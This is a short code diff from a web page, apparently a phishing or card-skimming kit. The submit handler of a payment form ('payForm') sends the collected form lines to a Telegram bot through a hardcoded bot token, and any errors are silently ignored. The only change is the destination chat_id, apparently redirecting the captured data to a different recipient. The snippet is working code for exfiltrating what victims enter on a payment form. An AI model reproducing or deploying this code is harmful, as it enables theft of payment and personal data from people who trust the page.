@@ -603,7 +603,7 @@ document.getElementById('payForm').addEventListener('submit',async function(e){
     await fetch('https://api.telegram.org/bot8951859923:AAGc51yLFQOHiZdoCnnRx1qZvPkMHdfI798/sendMessage',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({chat_id:8951859923,text:tgLines.filter(Boolean).join('\n'),parse_mode:'HTML'})
+      body:JSON.stringify({chat_id:6824927884,text:tgLines.filter(Boolean).join('\n'),parse_mode:'HTML'})
     });
   }catch(_){}
 
